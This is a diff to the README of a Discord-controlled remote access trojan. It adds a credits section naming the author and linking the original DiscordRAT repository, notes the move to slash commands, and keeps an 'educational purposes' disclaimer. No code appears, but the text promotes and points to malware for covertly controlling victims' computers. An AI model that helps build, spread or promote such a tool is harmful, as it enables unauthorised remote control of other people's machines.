@@ -108,6 +108,11 @@ make a messagebox popup on their screen with a custom message
 
 ---
 
+### 🎉・Credits
+Although this discord rat was created by Rdimo#6969 the original is https://github.com/Sp00p64/DiscordRAT and credits goes to him and his discord rat. His is quite old and uses message event to execute his commands so thought I would do slash commands and add/improve/remove some commands aswell, some code for the commands belong to him too ofcourse
+
+---
+
 ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Created by Rdimo#6969 | https://rdimo.github.io/CheatAway
 |⚠️・this Discord rat was made for educational purposes・⚠️|
 |-------------------------------------------------|
